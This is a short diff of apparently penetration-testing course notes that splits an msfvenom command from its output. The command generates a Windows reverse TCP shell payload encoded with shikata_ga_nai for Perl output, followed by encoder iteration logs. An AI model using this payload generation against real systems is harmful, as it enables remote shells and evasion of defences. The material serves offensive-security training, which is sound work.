@@ -70,7 +70,9 @@ We should now look at the first line of the `$buf` and see how it changes when
 ### **Generating Payload - With Encoding**
 
 ```
-th1nyunb0y@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_naiFound 1 compatible encoders
+th1nyunb0y@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
+
+Found 1 compatible encoders
 Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
 x86/shikata_ga_nai succeeded with size 326 (iteration=0)
 x86/shikata_ga_nai succeeded with size 353 (iteration=1)
